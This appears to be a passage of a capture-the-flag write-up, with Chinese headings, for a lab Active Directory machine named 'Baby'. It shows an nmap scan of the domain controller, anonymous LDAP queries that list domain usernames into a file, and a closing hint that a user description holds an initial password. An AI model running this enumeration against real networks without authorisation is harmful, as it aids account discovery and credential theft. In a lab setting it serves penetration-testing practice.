## Baby
```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-11 10:57:14Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-11-11T10:57:55+00:00; -4s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: BABY
|   NetBIOS_Domain_Name: BABY
|   NetBIOS_Computer_Name: BABYDC
|   DNS_Domain_Name: baby.vl
|   DNS_Computer_Name: BabyDC.baby.vl
|   DNS_Tree_Name: baby.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-11-11T10:57:15+00:00
| ssl-cert: Subject: commonName=BabyDC.baby.vl
| Not valid before: 2025-08-18T12:14:43
|_Not valid after:  2026-02-17T12:14:43
Service Info: Host: BABYDC; OS: Windows; CPE: cpe:/o:microsoft:windows
```
```
[★]$ echo '10.129.3.97 baby.vl BabyDC.baby.vl' | sudo tee -a /etc/hosts
10.129.3.97 baby.vl BabyDC.baby.vl
```
### LDAP 
#### 枚举到了域内的用户账号：sAMAccountName 是 Windows/AD 中的登录名
```
[★]$ ldapsearch -x -b "dc=baby,dc=vl" "(objectClass=user)" -H ldap://BabyDC.baby.vl | grep sAMAccountName
sAMAccountName: Guest
sAMAccountName: Jacqueline.Barnett
sAMAccountName: Ashley.Webb
sAMAccountName: Hugh.George
sAMAccountName: Leonard.Dyer
sAMAccountName: Connor.Wilkinson
sAMAccountName: Joseph.Hughes
sAMAccountName: Kerry.Wilson
sAMAccountName: Teresa.Bell
```
#### 提取用户名
```
[★]$ ldapsearch -x -b "dc=baby,dc=vl" "(objectClass=user)" -H ldap://BabyDC.baby.vl | grep '^sAMAccountName:' | awk -F': ' '{print $2}' > users.txt

[★]$ cat users.txt
Guest
Jacqueline.Barnett
Ashley.Webb
Hugh.George
Leonard.Dyer
Connor.Wilkinson
Joseph.Hughes
Kerry.Wilson
Teresa.Bell
```
#### 与其他用户的区别在于decription初始密码
